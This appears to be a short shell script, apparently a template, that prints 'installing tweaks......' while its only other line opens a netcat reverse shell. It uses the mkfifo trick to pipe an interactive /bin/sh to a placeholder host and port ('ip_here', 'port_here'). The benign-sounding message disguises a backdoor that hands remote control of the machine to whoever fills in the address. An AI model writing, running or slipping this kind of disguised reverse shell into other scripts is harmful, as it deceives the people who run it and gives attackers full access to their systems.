
echo installing tweaks......
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip_here port_here >/tmp/f
            